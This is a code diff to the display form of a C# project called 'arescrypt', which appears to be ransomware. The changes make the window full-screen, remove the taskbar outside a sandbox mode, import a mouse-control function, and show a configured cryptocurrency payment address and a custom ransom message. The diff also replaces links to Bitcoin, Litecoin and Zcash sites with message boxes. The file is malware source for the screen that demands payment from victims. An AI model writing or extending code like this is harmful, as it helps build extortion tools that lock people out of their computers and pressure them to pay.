@@ -11,17 +11,20 @@ namespace arescrypt
 
         [DllImport("user32.dll")]
         static extern void mouse_event(uint dwflag);
+        static Configuration config = new Configuration();
 
         public Display() {
             InitializeComponent();
 
-            if (!Configuration.sandBox) // == false
+            // Make configurations, as required
+            if (!config.sandBox) // == false
             {   // This will maximize the screen, and eliminate the taskbar. 
                 this.WindowState = FormWindowState.Maximized;
                 this.FormBorderStyle = FormBorderStyle.None;
             }
 
-            this.displayMessage.Text = Configuration.customDisplayMessage;
+            this.cryptoAddress.Text = config.cryptoAddress;
+            this.displayMessage.Text = config.customDisplayMessage;
         }
         
         Point cursorPos = new Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
@@ -98,12 +101,12 @@ namespace arescrypt
         }
 
         private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        { Process.Start("https://bitcoin.org"); }
+        { MessageBox.Show("Learn more about Bitcoin at [https://bitcoin.org/]"); } // Process.Start("https://bitcoin.org"); }
 
         private void aboutLitecoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        { Process.Start("https://litecoin.com/"); }
+        { MessageBox.Show("Learn more about Litecoin at [https://litecoin.com/]"); } // Process.Start("https://litecoin.com/"); }
 
         private void aboutZcash_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        { Process.Start("https://z.cash/"); }
+        { MessageBox.Show("Learn more about Zcash at [https://z.cash/]"); } // Process.Start("https://z.cash/"); }
     }
 }
